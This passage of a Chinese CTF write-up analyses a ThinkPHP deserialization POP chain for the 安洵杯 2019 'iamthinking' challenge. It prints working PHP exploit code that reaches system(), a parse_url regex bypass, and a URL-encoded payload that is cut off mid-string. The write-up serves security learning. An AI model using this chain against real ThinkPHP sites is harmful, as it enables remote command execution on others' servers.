<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toArray</span>(<span class="hljs-params"></span>): <span class="hljs-title">array</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$item</span>       = [];<br>        <span class="hljs-variable">$hasVisible</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;visible <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;   <span class="hljs-comment">//数据输出显示的属性</span><br>            <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$val</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$val</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$relation</span>, <span class="hljs-variable">$name</span>)      = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$val</span>);<br>                    <span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$relation</span>][] = <span class="hljs-variable">$name</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$val</span>] = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$hasVisible</span>          = <span class="hljs-literal">true</span>;<br>                &#125;<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]); <span class="hljs-comment">//置空visible所有元素</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;hidden <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;  <span class="hljs-comment">//数据输出隐藏的属性</span><br>            <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$val</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$val</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$relation</span>, <span class="hljs-variable">$name</span>)     = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$val</span>);<br>                    <span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$relation</span>][] = <span class="hljs-variable">$name</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$val</span>] = <span class="hljs-literal">true</span>;<br>                &#125;<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 合并关联数据</span><br>        <span class="hljs-variable">$data</span> = array_merge(<span class="hljs-keyword">$this</span>-&gt;data, <span class="hljs-keyword">$this</span>-&gt;relation); <span class="hljs-comment">//array_merge() 将一个或多个数组的单元合并起来，一个数组中的值附加在前一个数组的后面。返回作为结果的数组。</span><br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> Model || <span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> ModelCollection) &#123;<br>                <span class="hljs-comment">// 关联模型对象</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]) &amp;&amp; is_array(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>])) &#123;<br>                    <span class="hljs-variable">$val</span>-&gt;visible(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]);<br>                &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &amp;&amp; is_array(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>])) &#123;<br>                    <span class="hljs-variable">$val</span>-&gt;hidden(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]);<br>                &#125;<br>                <span class="hljs-comment">// 关联模型对象</span><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) || <span class="hljs-literal">true</span> !== <span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &#123;<br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$val</span>-&gt;toArray();<br>                &#125;<br>            &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>])) &#123;<br>                <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-keyword">$this</span>-&gt;getAttr(<span class="hljs-variable">$key</span>);<br>            &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &amp;&amp; !<span class="hljs-variable">$hasVisible</span>) &#123;<br>                <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-keyword">$this</span>-&gt;getAttr(<span class="hljs-variable">$key</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 追加属性（必须定义获取器）</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;append <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$name</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;appendAttrToArray(<span class="hljs-variable">$item</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$name</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$item</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>​    因为我们探讨的是 toArray() 的返回值，所以需要关注 $item的值从何何来 不难看到 line47,line49都是用了getAttr()这个函数，跟进这个函数</p>
+<p>于是在 <code>安洵杯 2019]iamthinking\www\tp\vendor\topthink\think-orm\src\model\concern\Attribute.php</code> 发现了函数定义 传入参数 为 $key</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取器 获取数据对象的值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@access</span> public</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  string $name 名称</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> InvalidArgumentException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAttr</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;  <span class="hljs-comment">//异常处理 一般情况使用</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable">$relation</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-variable">$value</span>    = <span class="hljs-keyword">$this</span>-&gt;getData(<span class="hljs-variable">$name</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">InvalidArgumentException</span> <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-variable">$relation</span> = <span class="hljs-keyword">$this</span>-&gt;isRelationAttr(<span class="hljs-variable">$name</span>);<br>            <span class="hljs-variable">$value</span>    = <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;getValue(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$relation</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>​    这里正常的思路自然是  走 常规的支路 随后直接返回getValue的值，于是我继续跟进了getValue函数，这里也可能是出题人的小心思，一下让我看到了解题的希望，一眼看到了 system(ls,)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getValue</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$relation</span> = <span class="hljs-literal">false</span></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-comment">// 检测属性获取器</span><br>       <span class="hljs-variable">$fieldName</span> = <span class="hljs-keyword">$this</span>-&gt;getRealFieldName(<span class="hljs-variable">$name</span>);<br>       <span class="hljs-variable">$method</span>    = <span class="hljs-string">&#x27;get&#x27;</span> . Str::studly(<span class="hljs-variable">$name</span>) . <span class="hljs-string">&#x27;Attr&#x27;</span>;<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>])) &#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>               <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getRelationValue(<span class="hljs-variable">$relation</span>);<br>           &#125;<br><br>           <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$fieldName</span>, <span class="hljs-keyword">$this</span>-&gt;json) &amp;&amp; is_array(<span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>])) &#123;<br>               <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getJsonValue(<span class="hljs-variable">$fieldName</span>, <span class="hljs-variable">$value</span>);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-comment">//$fieldName = a</span><br>               <span class="hljs-comment">//withAttr[a] = system</span><br>               <span class="hljs-variable">$closure</span> = <span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>];<br>               <span class="hljs-comment">//value = system(ls,)</span><br>               <span class="hljs-variable">$value</span>   = <span class="hljs-variable">$closure</span>(<span class="hljs-variable">$value</span>, <span class="hljs-keyword">$this</span>-&gt;data);<br>           &#125;<br>       &#125; <span class="hljs-keyword">elseif</span> (method_exists(<span class="hljs-keyword">$this</span>, <span class="hljs-variable">$method</span>)) &#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>               <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getRelationValue(<span class="hljs-variable">$relation</span>);<br>           &#125;<br><br>           <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$method</span>(<span class="hljs-variable">$value</span>, <span class="hljs-keyword">$this</span>-&gt;data);<br>       &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;type[<span class="hljs-variable">$fieldName</span>])) &#123;<br>           <span class="hljs-comment">// 类型转换</span><br>           <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;readTransform(<span class="hljs-variable">$value</span>, <span class="hljs-keyword">$this</span>-&gt;type[<span class="hljs-variable">$fieldName</span>]);<br>       &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; in_array(<span class="hljs-variable">$fieldName</span>, [<span class="hljs-keyword">$this</span>-&gt;createTime, <span class="hljs-keyword">$this</span>-&gt;updateTime])) &#123;<br>           <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getTimestampValue(<span class="hljs-variable">$value</span>);<br>       &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$relation</span>) &#123;<br>           <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getRelationValue(<span class="hljs-variable">$relation</span>);<br>           <span class="hljs-comment">// 保存关联对象值</span><br>           <span class="hljs-keyword">$this</span>-&gt;relation[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>   &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>​    直接关注利用点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$fieldName</span>, <span class="hljs-keyword">$this</span>-&gt;json) &amp;&amp; is_array(<span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>])) &#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;getJsonValue(<span class="hljs-variable">$fieldName</span>, <span class="hljs-variable">$value</span>);<br> &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//$fieldName = a</span><br>                <span class="hljs-comment">//withAttr[a] = system</span><br>                <span class="hljs-variable">$closure</span> = <span class="hljs-keyword">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>];<br>                <span class="hljs-comment">//value = system(ls,)</span><br>                <span class="hljs-variable">$value</span>   = <span class="hljs-variable">$closure</span>(<span class="hljs-variable">$value</span>, <span class="hljs-keyword">$this</span>-&gt;data);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​    这个很命令执行了，为了执行到else后面的语句块，前面if的条件一定不能满足。然后关注 $clousure,$value两个变量的值 因为system函数允许传入两个参数 system(ls,)是可行的</p>
+<ul>
+<li>$clousure</li>
+</ul>
+<p>来源于withAttr[$fieldName];   <code>$fieldName = $this-&gt;getRealFieldName($name);</code> </p>
+<p>跟进一下 getRealFieldName 注意这里$name 实际上是前面传入的 $key</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRealFieldName</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;strict ? <span class="hljs-variable">$name</span> : Str::snake(<span class="hljs-variable">$name</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>只要 $this-&gt;strict 为 True 就直接返回原结果，然而strict默认是true <code>protected $strict = true;</code></p>
+<ul>
+<li>$value</li>
+</ul>
+<p>按照现有思路 $value的值在getValue函数中没有体现，在getAttr里出现了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAttr</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    ...</span><br><span class="hljs-function">$<span class="hljs-title">value</span>    = $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">getData</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getData</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>...<br><span class="hljs-variable">$fieldName</span> = <span class="hljs-keyword">$this</span>-&gt;getRealFieldName(<span class="hljs-variable">$name</span>);<br><span class="hljs-keyword">if</span> (array_key_exists(<span class="hljs-variable">$fieldName</span>, <span class="hljs-keyword">$this</span>-&gt;data)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-variable">$fieldName</span>];&#125;<br>    <span class="hljs-keyword">elseif</span> (array_key_exists(<span class="hljs-variable">$name</span>, <span class="hljs-keyword">$this</span>-&gt;relation)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;relation[<span class="hljs-variable">$name</span>];<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​    可以发现有由用到了这个 getRealFieldName 函数和上面一样</p>
+<p>​    那这个$clousure,$value已经完全可控了 满足后面的条件即可 <code> if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName])</code></p>
+<p>​    看第二个条件判断 这里是判断的withAttr的其中一个值是否为数组 也就是说 只要 withAttr是一维数组就可以使返回结果为 False 进而进入到else分支执行命令</p>
+<p>由此有简易exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span>;<br>	<span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Attribute</span></span>&#123;<br>	<span class="hljs-keyword">$this</span>-&gt;withAttr = [<span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;system&quot;</span>];<br>	<span class="hljs-keyword">$this</span>-&gt;data = [<span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;ls&quot;</span>]; <br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="构建你的exp"><a href="#构建你的exp" class="headerlink" title="构建你的exp"></a>构建你的exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;<br>	<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lazySave</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$withEvent</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;lazySave = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;withEvent = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;exists = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;<br>    &#125;<br>	<br>    &#125;<br>    <span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Attribute</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span>=[<span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;cat /flag&quot;</span>];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span>=[<span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;system&quot;</span>];<br>    &#125;<br>	<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<br><br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Pivot();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Pivot(<span class="hljs-variable">$a</span>);<br><br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="彩，彩蛋？"><a href="#彩，彩蛋？" class="headerlink" title="彩，彩蛋？"></a>彩，彩蛋？</h2><p>都写这么多了把这题wp补充一下吧</p>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202260124476.png" srcset="/img/loading.gif" lazyload alt="image-20220226012427395"></p>
+<p>上面构造完exp 然后看首页这里有反序列化入口，不过上面有个正则。我们改怎么Bypass？这里可以用 parse_url缺陷来绕过</p>
+<p>eg:</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">parse<span class="hljs-constructor">_url(&#x27;<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">a</span>.<span class="hljs-params">php</span>?<span class="hljs-params">id</span>=1&#x27;)</span><br><span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>
+
+<p>这样payload不会被检查</p>
+<p>最后的payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">37</span>dda<span class="hljs-number">676</span>-f<span class="hljs-number">281</span>-<span class="hljs-number">413</span>f-<span class="hljs-number">973</span>a-d<span class="hljs-number">17392</span>b<span class="hljs-number">20</span>e<span class="hljs-number">14</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>///public/index.php?payload=O%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>lazySave%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>withEvent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">19</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>exists%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>table%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>lazySave%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>withEvent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">19</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>exists%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>table%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span 